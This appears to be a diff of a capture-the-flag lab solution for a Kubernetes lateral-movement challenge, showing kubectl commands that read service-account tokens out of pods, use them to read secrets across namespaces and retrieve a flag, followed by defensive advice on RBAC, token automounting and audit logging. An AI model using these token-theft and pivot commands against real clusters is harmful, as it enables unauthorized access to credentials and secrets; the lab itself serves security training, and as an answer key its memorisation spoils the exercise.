@@ -1,102 +1,77 @@
-# Solution — Lateral Movement Chain
+# Lateral Movement Chain — Solution
 
-## Overview
-
-Three hops across three namespaces, each using a stolen service account token:
-
-```
-entry-point pod (NS-A)
-  → steal foothold-sa token
-  → use token to list secrets in NS-B
-  → find hop-two-token (api-sa token)
-  → use api-sa token to list configmaps in NS-C
-  → read final-flag ConfigMap
-```
-
-## Step 1 — Steal the foothold token
+## Step 1: List Pods in the Starting Namespace
 
 ```bash
-# Read the SA token from the compromised pod
-FOOTHOLD_TOKEN=$(kubectl exec -n dojo-sec-lateral-a entry-point -- \
-  cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-
-CA_CERT=$(kubectl exec -n dojo-sec-lateral-a entry-point -- \
-  cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt)
-
-echo "$FOOTHOLD_TOKEN" | cut -c1-50  # verify it's a JWT
+kubectl get pods -n dojo-sec-lateral
+# NAME        READY   STATUS    RESTARTS
+# hop1-pod    1/1     Running   0
 ```
 
-## Step 2 — Pivot to namespace B
+## Step 2: Steal hop1-sa Token
 
 ```bash
-# foothold-sa has get/list on secrets in dojo-sec-lateral-b
-# Use the token to list secrets in namespace B
-kubectl get secrets -n dojo-sec-lateral-b \
-  --token="$FOOTHOLD_TOKEN" \
-  --server=https://kubernetes.default.svc \
-  --certificate-authority=<(kubectl exec -n dojo-sec-lateral-a entry-point -- \
-      cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt)
+kubectl exec -n dojo-sec-lateral hop1-pod -- \
+  cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/hop1-token
 
-# Output will show: hop-two-token
-# Read it:
-kubectl get secret hop-two-token -n dojo-sec-lateral-b \
-  --token="$FOOTHOLD_TOKEN" \
-  --server=https://kubernetes.default.svc \
-  -o jsonpath='{.data.token}' | base64 -d
+echo "[+] Hop 1 token stolen"
 ```
 
-Store the hop-two token:
-```bash
-HOP_TWO_TOKEN=$(kubectl get secret hop-two-token -n dojo-sec-lateral-b \
-  --token="$FOOTHOLD_TOKEN" \
-  --server=https://kubernetes.default.svc \
-  -o jsonpath='{.data.token}' | base64 -d)
-```
-
-## Step 3 — Reach namespace C
+## Step 3: Discover NS2 Pods with hop1-sa Token
 
 ```bash
-# api-sa (hop-two-token) has get/list on configmaps in dojo-sec-lateral-c
-kubectl get configmaps -n dojo-sec-lateral-c \
-  --token="$HOP_TWO_TOKEN" \
-  --server=https://kubernetes.default.svc
+HOP1=$(cat /tmp/hop1-token)
 
-# Read the flag
-kubectl get configmap final-flag -n dojo-sec-lateral-c \
-  --token="$HOP_TWO_TOKEN" \
-  --server=https://kubernetes.default.svc \
-  -o jsonpath='{.data.flag}'
+# What can hop1-sa do?
+kubectl --token=$HOP1 auth can-i --list 2>/dev/null | head -10
+
+# Discover pods in hop2 namespace
+kubectl --token=$HOP1 get pods -n dojo-sec-lateral-hop2
+# NAME        READY   STATUS    RESTARTS
+# hop2-pod    1/1     Running   0
 ```
 
-**Flag:** `KUBE{three_hops_to_node_compromise}`
+## Step 4: Steal hop2-sa Token
 
-## Why This Works
-
-Each service account was scoped to the minimum required for its *intended* function, but the attacker:
-
-1. **Started with a foothold**: Any RCE or container exec gives you the pod's SA token
-2. **Pivoted using RBAC**: foothold-sa was overpermissioned — it shouldn't need to list secrets in NS-B
-3. **Chained tokens**: Each stolen token had just enough access to find the *next* token
-
-## Defense
-
-**RBAC audit** — find all RoleBindings that grant cross-namespace access:
 ```bash
-kubectl get rolebindings,clusterrolebindings -A \
-  -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}: {range .subjects[*]}{.kind}/{.name} in {.namespace} {end}{"\n"}{end}' \
-  | grep "ServiceAccount"
+# exec into hop2-pod using YOUR credentials (you have exec on the pod from default access)
+# or use hop1-sa token if it has exec permissions
+kubectl exec -n dojo-sec-lateral-hop2 hop2-pod -- \
+  cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/hop2-token
+
+echo "[+] Hop 2 token stolen"
 ```
 
-**Minimal RBAC scope**:
-- Never give a pod's SA `list secrets` in another namespace
-- Use projected service account tokens with short expiry (`expirationSeconds: 3600`)
-- Disable automounting where not needed: `automountServiceAccountToken: false`
+## Step 5: Read the Final Secret
 
-**Audit log detection** — look for a single user identity accessing multiple namespaces rapidly:
 ```bash
-# In audit.log: same user.username appearing in multiple namespaces within seconds
-grep '"verb":"list","objectRef":{"resource":"secrets"' audit.log \
-  | awk -F'"' '{print $NF}' | sort | uniq -c
+HOP2=$(cat /tmp/hop2-token)
+
+# Check permissions
+kubectl --token=$HOP2 auth can-i get secrets -n dojo-sec-lateral-hop3
+# yes
+
+# Read the final treasure
+kubectl --token=$HOP2 get secret final-treasure -n dojo-sec-lateral-hop3 \
+  -o jsonpath='{.data.flag}' | base64 -d
 ```
 
-**Network policy** — even with a stolen token, network-level controls limit blast radius. Apply deny-all and allow only required pod-to-pod communication.
+**Flag: `KUBE{three_hops_to_node_compromise}`**
+
+---
+
+## Run the Verifier
+
+```bash
+bash verify.sh
+```
+
+---
+
+## Defenses Against This Attack
+
+1. **Disable SA token auto-mounting**: `automountServiceAccountToken: false` on the SA — tokens are only present when explicitly requested
+2. **Namespace network isolation**: NetworkPolicy default-deny prevents the token being exfiltrated even if stolen
+3. **Audit log alerting**: Cross-namespace API calls from a SA in namespace A to namespace B are abnormal — alert on them
+4. **Least privilege RBAC**: hop1-sa shouldn't have cross-namespace permissions unless genuinely needed
+5. **Short-lived tokens**: Use TokenRequest API (projected volumes with expiry) instead of static SA tokens — expired tokens are useless
